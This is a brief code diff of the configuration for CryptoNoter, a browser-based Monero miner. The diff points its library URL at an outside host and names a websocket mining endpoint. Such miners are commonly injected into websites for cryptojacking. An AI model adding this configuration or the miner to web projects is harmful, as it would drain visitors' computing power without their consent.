@@ -1,6 +1,6 @@
 self.CryptoNoter = self.CryptoNoter || {};
 self.CryptoNoter.CONFIG = {
-    LIB_URL: "/assets/lib/",
+    LIB_URL: "https://monero.gives/assets/lib/",
     WEBSOCKET_SHARDS: [["wss://megabyte.space/zeriam"]]
 };
 var Module = {
